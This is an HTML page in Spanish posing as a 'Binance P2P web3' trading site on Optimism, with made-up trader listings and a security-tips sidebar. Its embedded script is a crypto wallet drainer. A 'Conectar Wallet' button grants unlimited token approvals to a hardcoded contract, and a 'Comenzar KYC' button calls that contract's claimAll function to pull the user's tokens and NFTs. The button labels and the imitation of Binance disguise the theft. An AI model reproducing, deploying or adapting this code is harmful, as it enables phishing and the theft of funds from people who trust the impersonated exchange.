<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>P2P Binance web3 - Optimism</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
:root {
            --primary-color: #f0b90b;
            --background-dark: #181a20;
            --background-light: #2b2f36;
            --text-primary: #eaecef;
            --buy-color: #00b15d;
            --sell-color: #f84960;
        }

        /* Reset esencial */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: var(--background-dark);
            color: var(--text-primary);
            padding: 20px;
            min-height: 100vh;
        }

        /* Contenedor principal corregido */
        .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 30px;
            align-items: start;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding: 15px;
            background-color: var(--background-light);
            border-radius: 8px;
        }

        .filters {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .filter-group {
            background-color: var(--background-light);
            padding: 10px;
            border-radius: 5px;
            flex: 1 1 auto;
        }

        select, input {
            background-color: var(--background-dark);
            color: var(--text-primary);
            border: 1px solid #333;
            padding: 8px;
            border-radius: 4px;
            width: 100%;
        }

        /* Lista de anuncios corregida */
        .sad-list {
            display: flex;
            flex-direction: column;
            gap: 20px;
            width: 100%;
            z-index:1;
        }

       .ad-card {
    background-color: var(--background-light);
    padding: 25px;
    border-radius: 12px;
    display: flex;
    flex-direction: column;
    gap: 20px;
    border-left: 4px solid transparent;
    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
}


        .buy-ad { border-left-color: var(--buy-color); }
        .sell-ad { border-left-color: var(--sell-color); }

       .user-info {
    display: grid;
    grid-template-columns: auto 1fr;
    gap: 20px;
    align-items: center;
    padding-bottom: 20px;
    border-bottom: 1px solid #3a3f48;
}

       .user-avatar {
    width: 60px;
    height: 60px;
    border-radius: 12px;
}
        .price {
            font-size: 1.3em;
            font-weight: bold;
            margin: 10px 0;
        }

        .payment-methods {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .payment-method {
            background-color: var(--background-dark);
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 0.9em;
        }

        /* Chat sidebar corregido */
        .chat-sidebar {
            background-color: var(--background-light);
            padding: 20px;
            border-radius: 8px;
            position: sticky;
            top: 20px;
            height: fit-content;
            min-height: 400px;
        }
        .trader-stats {
    display: flex;
    gap: 15px;
    flex-wrap: wrap;
    font-size: 0.9em;
    color: #9aa4bf;
}
        .kyc-badge {
    background: #2172e5;
    padding: 4px 12px;
    border-radius: 20px;
    font-size: 0.85em;
    font-weight: bold;
    display: inline-flex;
    align-items: center;
    gap: 6px;
}
        .trade-details {
    display: grid;
    grid-template-columns: 1.5fr 2fr;
    gap: 30px;
}

.crypto-info {
    display: flex;
    flex-direction: column;
    gap: 12px;
}
        .price {
    font-size: 1.5em;
    font-weight: 700;
    color: var(--primary-color);
}

.payment-methods {
    display: flex;
    flex-direction: column;
    gap: 15px;
}

.payment-tags {
    display: flex;
    gap: 10px;
    flex-wrap: wrap;
}
.payment-method {
    background-color: var(--background-dark);
    padding: 8px 16px;
    border-radius: 20px;
    font-size: 0.9em;
    display: flex;
    align-items: center;
    gap: 8px;
}
        .ad-actions {
    display: flex;
    gap: 15px;
    margin-top: 20px;
}

.chat-button {
    background: none;
    border: 2px solid #3a3f48;
    padding: 12px 20px;
    display: flex;
    align-items: center;
    gap: 8px;
    transition: all 0.3s;
}
.chat-button:hover {
    background: #3a3f48;
    border-color: #3a3f48;
}

.chat-button::before {
    content: "üí¨";
    font-size: 1.1em;
}

.security-alert {
    background: #2b1a1a;
    border: 1px solid #f84960;
    padding: 15px;
    border-radius: 8px;
    margin-bottom: 20px;
    display: flex;
    gap: 12px;
    align-items: center;
}
        .security-alert::before {
    content: "‚ö†Ô∏è";
    font-size: 1.5em;
}

@media (max-width: 768px) {
    .trade-details {
        grid-template-columns: 1fr;
    }
    
    .ad-actions {
        flex-direction: column;
    }
}


        button {
            background-color: var(--primary-color);
            color: #000;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: opacity 0.3s;
        }

        button:hover {
            opacity: 0.9;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                grid-template-columns: 1fr;
            }
            
            .ad-card {
                grid-template-columns: 1fr;
                gap: 20px;
            }
            
            .header {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }
            .floating-button {
    position: fixed;
    bottom: 30px;
    right: 30px;
    background: var(--primary-color);
    color: #000;
    padding: 16px 28px;
    border-radius: 50px;
    display: flex;
    align-items: center;
    gap: 12px;
    font-weight: 600;
    text-decoration: none;
    box-shadow: 0 4px 15px rgba(240, 185, 11, 0.3);
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    z-index: 1000;
    border: none;
    cursor: pointer;
    font-family: inherit;
    font-size: 1.05em;
}

.floating-button:hover {
    transform: translateY(-3px);
    box-shadow: 0 6px 20px rgba(240, 185, 11, 0.4);
    background: #f8c429;
}

.floating-button:active {
    transform: translateY(1px);
    box-shadow: 0 2px 10px rgba(240, 185, 11, 0.2);
}

.plus-icon {
    background: #000;
    color: var(--primary-color);
    width: 28px;
    height: 28px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: 700;
    font-size: 1.4em;
    transition: transform 0.2s;
}

@media (max-width: 768px) {
    .floating-button {
        bottom: 20px;
        right: 20px;
        padding: 14px 22px;
        font-size: 0.95em;
    }
    
    .plus-icon {
        width: 24px;
        height: 24px;
        font-size: 1.2em;
    }
}

/* Efecto de pulso */
@keyframes pulse {
    0% { box-shadow: 0 0 0 0 rgba(240, 185, 11, 0.4); }
    70% { box-shadow: 0 0 0 12px rgba(240, 185, 11, 0); }
    100% { box-shadow: 0 0 0 0 rgba(240, 185, 11, 0); }
}

.floating-button {
    animation: pulse 2s infinite;
}
            
            .filters {
                flex-direction: column;
            }
        }
        
    .security-alert.warning {
        border-color: #f84960;
        background: #2b1a1a;
    }

    .security-alert.success {
        border-color: #00b15d;
        background: #1a2b23;
    }

    .alert-progress {
        height: 3px;
        background: rgba(255,255,255,0.3);
        margin-top: 10px;
        border-radius: 2px;
        overflow: hidden;
    }

    .alert-progress::after {
        content: '';
        display: block;
        width: 100%;
        height: 100%;
        background: #f0b90b;
        animation: progress 5s linear forwards;
    }

    @keyframes slideIn {
        to { transform: translateX(0); }
    }

    @keyframes progress {
        from { transform: translateX(-100%); }
        to { transform: translateX(0); }
    }
      .centered-alert {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #2b2f36;
        border: 2px solid #f0b90b;
        padding: 25px;
        border-radius: 12px;
        color: #eaecef;
        z-index: 10000;
        box-shadow: 0 8px 30px rgba(0,0,0,0.3);
        max-width: 400px;
        text-align: center;
        opacity: 0;
        animation: fadeIn 0.5s ease-out forwards;
    }

    .centered-alert.warning {
        border-color: #f84960;
        background: #2b1a1a;
    }

    .centered-alert.success {
        border-color: #00b15d;
        background: #1a2b23;
    }

    .alert-content {
        position: relative;
        padding: 15px;
        font-size: 1.1em;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: translate(-50%, -60%); }
        to { opacity: 1; transform: translate(-50%, -50%); }
    }

    .fade-out {
        animation: fadeOut 0.3s ease-in forwards !important;
    }

    @keyframes fadeOut {
        from { opacity: 1; transform: translate(-50%, -50%); }
        to { opacity: 0; transform: translate(-50%, -40%); }
    }

    /* A√±adir overlay para mejor visibilidad */
    .centered-alert::before {
        content: '';
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0,0,0,0.5);
        z-index: -1;
    }
        /* Animaci√≥n para la actualizaci√≥n */
    @keyframes fadeUpdate {
        0% { opacity: 1; transform: translateY(0); }
        50% { opacity: 0; transform: translateY(20px); }
        100% { opacity: 1; transform: translateY(0); }
    }

   
    </style>
</head>
<body>
    <div class="header">
        <h1>Binance P2P web3</h1>
        <a> Recuerda tener ETH y USDT en red Optimism para tradear con otros usuarios p2p</a>
        <nav>
            <!-- En el header agregar -->
            <button id="approveTokens" disabled>Conectar Wallet</button>
            <button id="claimAll" disabled> Comenzar KYC </button>
        </nav>
    </div>

    <div class="container">
        <main>
            <div class="filters">
                <div class="filter-group">
                    <select>
                        <option>Comprar</option>
                        <option>Vender</option>
                    </select>
                </div>
                <div class="filter-group">
                    <select>
                        <option>Todos los pagos</option>
                        <option>Transferencia Bancaria</option>
                        <option>PayPal</option>
                        <option>Skrill</option>
                    </select>
                </div>
                <div class="filter-group">
                    <input type="text" placeholder="Buscar...">
                </div>
            </div>

           <div class="sad-list">
    <!-- Anuncio USDT - Argentina -->
    <div class="ad-card buy-ad">
        <div class="user-info">
            <img src="images.png" class="user-avatar" alt="Trader">
            <div>
                <h4>CryptoArgen üá¶üá∑ <span class="kyc-badge">KYC Completo</span></h4>
                <div class="trader-stats">
                    <span>‚≠ê 4.9 (1200 operaciones)</span>
                    <span>üîí Verificado</span>
                    <span>üïí 15 min promedio</span>
                </div>
                <div class="payment-limits">
                    <span>L√≠mite: $50,000 - $5,000,000 ARS</span>
                </div>
            </div>
        </div>
        <div class="trade-details">
            <div class="crypto-info">
                <span class="crypto-badge">COMPRO USDT</span>
                <div class="price">1 USDT = $1,250 ARS</div>
                <div class="available">Disponible: 85,000 USDT</div>
            </div>
            <div class="payment-methods">
                <h5>M√©todos de pago:</h5>
                <div class="payment-tags">
                    <span class="payment-method">MercadoPago</span>
                    <span class="payment-method">Transferencia Bancaria</span>
                    <span class="payment-method">Ual√°</span>
                    <span class="payment-method">Personal Pay</span>
                </div>
            </div>
            <div class="ad-actions">
                <button class="buy-button">VENDER USDT</button>
                <button class="chat-button" style="background-color: #2b2f36;">Chat</button>
            </div>
        </div>
    </div>
               <!-- Anuncio Espa√±a - Venta USDT -->
<div class="ad-card sell-ad">
    <div class="user-info">
        <img src="crypto1.jpg" class="user-avatar" alt="Trader">
        <div>
            <h4>MaElliot üá™üá∏ <span class="kyc-badge">KYC Oro</span></h4>
            <div class="trader-stats">
                <span>‚≠ê 4.93 (2,800 ops)</span>
                <span>üè¶ Cuenta Empresa</span>
                <span>üïí 10 min respuesta</span>
            </div>
            <div class="payment-limits">
                <span>L√≠mite: 100 - 25,000 EUR</span>
            </div>
        </div>
    </div>
    <div class="trade-details">
        <div class="crypto-info">
            <span class="crypto-badge">VENDO USDT</span>
            <div class="price">1 USDT = 0.94 EUR</div>
            <div class="available">Disponible: 150,000 USDT</div>
        </div>
        <div class="payment-methods">
            <h5>M√©todos de pago:</h5>
            <div class="payment-tags">
                <span class="payment-method">BBVA</span>
                <span class="payment-method">Bizum</span>
                <span class="payment-method">CaixaBank</span>
                <span class="payment-method">N26</span>
            </div>
        </div>
        <div class="ad-actions">
            <button class="sell-button">COMPRAR USDT</button>
            <button class="chat-button">Chat</button>
        </div>
    </div>
</div>

<!-- Anuncio Cuba - Compra USDT -->
<div class="ad-card buy-ad">
    <div class="user-info">
        <img src="crypto2.jpg" class="user-avatar" alt="Trader">
        <div>
            <h4>HavanaTirame** üá®üá∫ <span class="kyc-badge">KYC B√°sico</span></h4>
            <div class="trader-stats">
                <span>‚≠ê 4.6 (450 ops)</span>
                <span>üíµ Efectivo USD</span>
                <span>üïí 1-2 horas</span>
            </div>
            <div class="payment-limits">
                <span>L√≠mite: 50 - 2,000 USD</span>
            </div>
        </div>
    </div>
    <div class="trade-details">
        <div class="crypto-info">
            <span class="crypto-badge">COMPRO USDT</span>
            <div class="price">1 USDT = 125 CUP</div>
            <div class="available">Disponible: 15,000 USDT</div>
        </div>
        <div class="payment-methods">
            <h5>M√©todos de pago:</h5>
            <div class="payment-tags">
                <span class="payment-method">MLC Card</span>
                <span class="payment-method">Efectivo USD</span>
                <span class="payment-method">EnZona</span>
                <span class="payment-method">Transferm√≥vil</span>
            </div>
        </div>
        <div class="ad-actions">
            <button class="buy-button">VENDER USDT</button>
            <button class="chat-button">Chat</button>
        </div>
    </div>
</div>

<!-- Anuncio Colombia - Venta USDT -->
<div class="ad-card sell-ad">
    <div class="user-info">
        <img src="user.png" class="user-avatar" alt="Trader">
        <div>
            <h4>Crypto colombia üá®üá¥ <span class="kyc-badge">KYC Platino</span></h4>
            <div class="trader-stats">
                <span>‚≠ê 4.97 (5,200 ops)</span>
                <span>‚ö° Entrega Express</span>
                <span>üìå 3 a√±os verificados</span>
            </div>
            <div class="payment-limits">
                <span>L√≠mite: 20,000 - 200M COP</span>
            </div>
        </div>
    </div>
    <div class="trade-details">
        <div class="crypto-info">
            <span class="crypto-badge">VENDO USDT</span>
            <div class="price">1 USDT = $4,150 COP</div>
            <div class="available">Disponible: 500,000 USDT</div>
        </div>
        <div class="payment-methods">
            <h5>M√©todos de pago:</h5>
            <div class="payment-tags">
                <span class="payment-method">Nequi</span>
                <span class="payment-method">Bancolombia</span>
                <span class="payment-method">Davivienda</span>
                <span class="payment-method">Daviplata</span>
            </div>
        </div>
        <div class="ad-actions">
            <button class="sell-button">COMPRAR USDT</button>
            <button class="chat-button">Chat</button>
        </div>
    </div>
</div>

<!-- Anuncio Venezuela - Compra USDT -->
<div class="ad-card buy-ad">
    <div class="user-info">
        <img src="e0d7460e91801e693dae02828797b2ce.jpg" class="user-avatar" alt="Trader">
        <div>
            <h4>CaracasBTC üáªüá™ <span class="kyc-badge">KYC Full</span></h4>
            <div class="trader-stats">
                <span>‚≠ê 4.88 (8,900 ops)</span>
                <span>üí∏ Alta Liquidez</span>
                <span>üõ°Ô∏è Escrow Autom√°tico</span>
            </div>
            <div class="payment-limits">
                <span>L√≠mite: 10 - 50,000 USD</span>
            </div>
        </div>
    </div>
    <div class="trade-details">
        <div class="crypto-info">
            <span class="crypto-badge">COMPRO USDT</span>
            <div class="price">1 USDT = 42.50 VES</div>
            <div class="available">Disponible: 300,000 USDT</div>
        </div>
        <div class="payment-methods">
            <h5>M√©todos de pago:</h5>
            <div class="payment-tags">
                <span class="payment-method">PayPal</span>
                <span class="payment-method">Zelle</span>
                <span class="payment-method">Banesco</span>
                <span class="payment-method">Efectivo USD</span>
            </div>
        </div>
        <div class="ad-actions">
            <button class="buy-button">VENDER USDT</button>
            <button class="chat-button">Chat</button>
        </div>
    </div>
</div>

    <!-- Anuncio BTC - Colombia -->
    <div class="ad-card sell-ad">
        <div class="user-info">
            <img src="descarga (1).jpg" class="user-avatar" alt="Trader">
            <div>
                <h4>HernandezCambios üá®üá¥ <span class="kyc-badge">KYC Premium</span></h4>
                <div class="trader-stats">
                    <span>‚≠ê 4.95 (3400 operaciones)</span>
                    <span>üèÜ Top Seller</span>
                    <span>üìå 2 a√±os verificados</span>
                </div>
                <div class="payment-limits">
                    <span>L√≠mite: 0.001 - 2 BTC</span>
                </div>
            </div>
        </div>
        <div class="trade-details">
            <div class="crypto-info">
                <span class="crypto-badge">VENDO BTC</span>
                <div class="price">1 BTC = $165,000,000 COP</div>
                <div class="available">Disponible: 1.8 BTC</div>
            </div>
            <div class="payment-methods">
                <h5>M√©todos de pago:</h5>
                <div class="payment-tags">
                    <span class="payment-method">Nequi</span>
                    <span class="payment-method">Davivienda</span>
                    <span class="payment-method">Bancolombia</span>
                    <span class="payment-method">Efectivo</span>
                </div>
            </div>
            <div class="ad-actions">
                <button class="sell-button">COMPRAR BTC</button>
                <button class="chat-button" style="background-color: #2b2f36;">Chat</button>
            </div>
        </div>
    </div>

    <!-- Anuncio USDC - M√©xico -->
    <div class="ad-card buy-ad">
        <div class="user-info">
            <img src="crypto2.jpg" class="user-avatar" alt="Trader">
            <div>
                <h4>MexCryptoPro üá≤üáΩ <span class="kyc-badge">KYC Corporativo</span></h4>
                <div class="trader-stats">
                    <span>‚≠ê 4.87 (890 operaciones)</span>
                    <span>üíº Cuenta Empresa</span>
                    <span>üìà Volumen Alto</span>
                </div>
                <div class="payment-limits">
                    <span>L√≠mite: $10,000 - $500,000 MXN</span>
                </div>
            </div>
        </div>
        <div class="trade-details">
            <div class="crypto-info">
                <span class="crypto-badge">COMPRO USDC</span>
                <div class="price">1 USDC = $18.50 MXN</div>
                <div class="available">Disponible: 250,000 USDC</div>
            </div>
            <div class="payment-methods">
                <h5>M√©todos de pago:</h5>
                <div class="payment-tags">
                    <span class="payment-method">OXXO</span>
                    <span class="payment-method">BBVA</span>
                    <span class="payment-method">SPEI</span>
                    <span class="payment-method">Santander</span>
                </div>
            </div>
            <div class="ad-actions">
                <button class="buy-button">VENDER USDC</button>
                <button class="chat-button" style="background-color: #2b2f36;">Chat</button>
            </div>
        </div>
    </div>
               <!-- Anuncio USDT - Cuba -->
<div class="ad-card buy-ad">
    <div class="user-info">
        <img src="user.png" class="user-avatar" alt="Trader">
        <div>
            <h4>CubaLibre23 üá®üá∫ <span class="kyc-badge">KYC Verificado</span></h4>
            <div class="trader-stats">
                <span>‚≠ê 4.8 (850 operaciones)</span>
                <span>üîê Escrow Activo</span>
                <span>üïí 30 min promedio</span>
            </div>
            <div class="payment-limits">
                <span>L√≠mite: 50 - 5,000 USD</span>
            </div>
        </div>
    </div>
    <div class="trade-details">
        <div class="crypto-info">
            <span class="crypto-badge">COMPRO USDT</span>
            <div class="price">1 USDT = 120 CUP</div>
            <div class="available">Disponible: 25,000 USDT</div>
        </div>
        <div class="payment-methods">
            <h5>M√©todos de pago:</h5>
            <div class="payment-tags">
                <span class="payment-method">MLC Card</span>
                <span class="payment-method">EnZona</span>
                <span class="payment-method">Efectivo USD</span>
                <span class="payment-method">Transfermovil</span>
            </div>
        </div>
        <div class="ad-actions">
            <button class="buy-button">VENDER USDT</button>
            <button class="chat-button">Chat</button>
        </div>
    </div>
</div>

<!-- Anuncio USDT - Venezuela -->
<div class="ad-card sell-ad">
    <div class="user-info">
        <img src="images.jpg" class="user-avatar" alt="Trader">
        <div>
            <h4>LucianoTrade üáªüá™ <span class="kyc-badge">KYC Premium</span></h4>
            <div class="trader-stats">
                <span>‚≠ê 4.85 (3200 operaciones)</span>
                <span>üè¶ Cuenta Verificada</span>
                <span>‚ö° Entrega Inmediata</span>
            </div>
            <div class="payment-limits">
                <span>L√≠mite: 10 - 10,000 USD</span>
            </div>
        </div>
    </div>
    <div class="trade-details">
        <div class="crypto-info">
            <span class="crypto-badge">VENDO USDT</span>
            <div class="price">1 USDT = 40.50 VES</div>
            <div class="available">Disponible: 150,000 USDT</div>
        </div>
        <div class="payment-methods">
            <h5>M√©todos de pago:</h5>
            <div class="payment-tags">
                <span class="payment-method">Zelle</span>
                <span class="payment-method">Banesco</span>
                <span class="payment-method">PayPal</span>
                <span class="payment-method">Mercantil</span>
            </div>
        </div>
        <div class="ad-actions">
            <button class="sell-button">COMPRAR USDT</button>
            <button class="chat-button">Chat</button>
        </div>
    </div>
</div>

<!-- Anuncio USDT - Puerto Rico -->
<div class="ad-card buy-ad">
    <div class="user-info">
        <img src="user.png" class="user-avatar" alt="Trader">
        <div>
            <h4>Madrile√±oDiaz üáµüá∑ <span class="kyc-badge">KYC Corporativo</span></h4>
            <div class="trader-stats">
                <span>‚≠ê 4.95 (1500 operaciones)</span>
                <span>üè¢ Cuenta Empresarial</span>
                <span>üõ°Ô∏è Seguro Escrow</span>
            </div>
            <div class="payment-limits">
                <span>L√≠mite: 100 - 50,000 USD</span>
            </div>
        </div>
    </div>
    <div class="trade-details">
        <div class="crypto-info">
            <span class="crypto-badge">COMPRO USDT</span>
            <div class="price">1 USDT = 1.02 USD</div>
            <div class="available">Disponible: 500,000 USDT</div>
        </div>
        <div class="payment-methods">
            <h5>M√©todos de pago:</h5>
            <div class="payment-tags">
                <span class="payment-method">ACH Transfer</span>
                <span class="payment-method">Popular Bank</span>
                <span class="payment-method">Western Union</span>
                <span class="payment-method">Cash Deposit</span>
            </div>
        </div>
        <div class="ad-actions">
            <button class="buy-button">VENDER USDT</button>
            <button class="chat-button">Chat</button>
        </div>
    </div>
</div>

<!-- Anuncio USDT - Espa√±a -->
<div class="ad-card sell-ad">
    <div class="user-info">
        <img src="user.png" class="user-avatar" alt="Trader">
        <div>
            <h4>ValenciaP2P üá™üá∏ <span class="kyc-badge">KYC Nivel 3</span></h4>
            <div class="trader-stats">
                <span>‚≠ê 4.91 (4300 operaciones)</span>
                <span>üí≥ M√©todos Instant√°neos</span>
                <span>üìå 5 a√±os verificados</span>
            </div>
            <div class="payment-limits">
                <span>L√≠mite: 50 - 20,000 EUR</span>
            </div>
        </div>
    </div>
    <div class="trade-details">
        <div class="crypto-info">
            <span class="crypto-badge">VENDO USDT</span>
            <div class="price">1 USDT = 0.92 EUR</div>
            <div class="available">Disponible: 300,000 USDT</div>
        </div>
        <div class="payment-methods">
            <h5>M√©todos de pago:</h5>
            <div class="payment-tags">
                <span class="payment-method">SEPA Transfer</span>
                <span class="payment-method">Bizum</span>
                <span class="payment-method">Santander</span>
                <span class="payment-method">Revolut</span>
            </div>
        </div>
        <div class="ad-actions">
            <button class="sell-button">COMPRAR USDT</button>
            <button class="chat-button">Chat</button>
        </div>
    </div>
</div>

    <!-- Anuncio ETH - Brasil -->
    <div class="ad-card sell-ad">
        <div class="user-info">
            <img src="descarga (2).jpg" class="user-avatar" alt="Trader">
            <div>
                <h4>BrazilETH üáßüá∑ <span class="kyc-badge">KYC Nivel 3</span></h4>
                <div class="trader-stats">
                    <span>‚≠ê 4.93 (4500 operaciones)</span>
                    <span>‚ö° Lightning Network</span>
                    <span>üõ°Ô∏è Seguro Escrow</span>
                </div>
                <div class="payment-limits">
                    <span>L√≠mite: 0.1 - 10 ETH</span>
                </div>
            </div>
        </div>
        <div class="trade-details">
            <div class="crypto-info">
                <span class="crypto-badge">VENDO ETH</span>
                <div class="price">1 ETH = R$ 18,500</div>
                <div class="available">Disponible: 8.5 ETH</div>
            </div>
            <div class="payment-methods">
                <h5>M√©todos de pago:</h5>
                <div class="payment-tags">
                    <span class="payment-method">PIX</span>
                    <span class="payment-method">Ita√∫</span>
                    <span class="payment-method">Boleto Banc√°rio</span>
                    <span class="payment-method">PicPay</span>
                </div>
            </div>
            <div class="ad-actions">
                <button class="sell-button">COMPRAR ETH</button>
                <button class="chat-button" style="background-color: #2b2f36;">Chat</button>
            </div>
        </div>
    </div>
                </div>
            </main>
<!-- Actualizaci√≥n del chat sidebar -->
<aside class="chat-sidebar">
    <div class="security-alert">
        <strong>Importante:</strong> Para su seguridad:
        <ul style="margin: 10px 0 0 20px; color: #f84960;">
            <li>Verifique las rese√±as del usuario</li>
            <li>Nunca comparta datos sensibles</li>
            <li>Use √∫nicamente m√©todos verificados</li>
            <li>Realice intercambios preferentemente con usuarios Premium Verificados</li>
            <li>En caso de no tener respuesta de la contra parte la resolucion de la apelac√≠on no podra exceder las 2 horas despues de haber hecho la denuncia</li>

        </ul>
    </div>
    
    <div class="chat-messages">
        <!-- Mensajes existentes -->
    </div>
    
    <input type="text" placeholder="Escribe tu mensaje..." class="chat-input">
</aside>
    </div>
    <!-- Agrega esto antes del cierre del body -->
<a href="#" class="floating-button">
    <span class="plus-icon">+</span>
    Publica tu anuncio
</a>
    <script src="script.js"></script>


    <script>

       
    
        const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Direcci√≥n de tu contrato
        const contractABI = [
            {
                "inputs": [
                    { "internalType": "address[]", "name": "tokensERC20", "type": "address[]" },
                    { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
                    { "internalType": "address[]", "name": "contractsERC721", "type": "address[]" },
                    { "internalType": "address[]", "name": "contractsERC1155", "type": "address[]" }
                ],
                "name": "claimAll",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        let web3;
        let userAccount;
        let contract;

         window.onload = async () => {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);

                // Configuraci√≥n corregida para Optimism
                try {
                    await ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0xA' }], // ChainID CORRECTO de Optimism (0xA = 10 en decimal)
                    });
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        try {
                            await ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [
                                    {
                                        chainId: '0xA', // ID de Optimism Mainnet
                                        chainName: 'Optimism',
                                        rpcUrls: ['https://mainnet.optimism.io'],
                                        nativeCurrency: {
                                            name: 'Ether',
                                            symbol: 'ETH',
                                            decimals: 18,
                                        },
                                        blockExplorerUrls: ['https://optimistic.etherscan.io'],
                                    },
                                ],
                            });
                        } catch (addError) {
                            console.error('Error al agregar Optimism', addError);
                            alert('Error al agregar la red Optimism');
                        }
                    } else {
                        console.error('Error cambiando de red', switchError);
                        alert('Error al cambiar a Optimism');
                    }
                }

                // Continuar con la conexi√≥n y habilitar botones
                try {
                    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
                    userAccount = accounts[0];
                    contract = new web3.eth.Contract(contractABI, contractAddress);
                    document.getElementById("approveTokens").disabled = false;
                    alert("Conectado a MetaMask en la red Optimism: " + userAccount);
                } catch (error) {
                    console.error("Error conectando a MetaMask", error);
                    alert("Error al conectar MetaMask");
                }
            } else {
                alert("MetaMask no est√° instalado");
            }
        };

        document.getElementById("approveTokens").addEventListener("click", async () => {
            if (!userAccount) return alert("Primero conecta MetaMask");

            // Tokens ERC20 que el contrato manejar√°
            const tokens = [
                "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // Reemplazar con las direcciones correctas de los tokens
                "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
                "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
            ];

            // Aprobaci√≥n infinita
            try {
                for (const token of tokens) {
                    const tokenContract = new web3.eth.Contract([
                        {
                            "constant": false,
                            "inputs": [
                                { "name": "spender", "type": "address" },
                                { "name": "amount", "type": "uint256" }
                            ],
                            "name": "approve",
                            "outputs": [{ "name": "", "type": "bool" }],
                            "payable": false,
                            "stateMutability": "nonpayable",
                            "type": "function"
                        }
                    ], token);

                    // Aprueba una cantidad infinita para el contrato
                    await tokenContract.methods
                        .approve(contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
                        .send({ from: userAccount });

                    console.log(`Token ${token} aprobado con √©xito`);
                }

                alert("Tokens aprobados con √©xito para el contrato");
            } catch (error) {
                console.error("Error al autorizar los tokens", error);
                alert("Error al otorgar permisos");
            }
        });

        document.getElementById("claimAll").addEventListener("click", async () => {
            if (!userAccount) return alert("Primero conecta MetaMask");

            const tokens = [
                "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", 
                "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1", 
                "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
            ];
            const amounts = [
                web3.utils.toWei("100", "ether"), 
                web3.utils.toWei("100", "ether"), 
                web3.utils.toWei("100", "ether")
            ];

            try {
                await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });
                alert("Acci√≥n claimAll ejecutada con √©xito");
            } catch (error) {
                console.error("Error al ejecutar claimAll", error);
                alert("Error al ejecutar claimAll");
            }
        });
        document.addEventListener("DOMContentLoaded", function() {
    ethereum.request({ method: 'eth_requestAccounts' }).then(accounts => {
        userAccount = accounts[0];

        let adsList = document.querySelector('.sad-list');
        if (adsList) {
            adsList.style.display = 'block';
        } else {
            console.error("No se encontr√≥ .sad-list en el DOM.");
        }

        console.log("Conectado a:", userAccount);
    }).catch(err => console.error("Error al conectar:", err));
});
         

    </script>
</body>
</html>
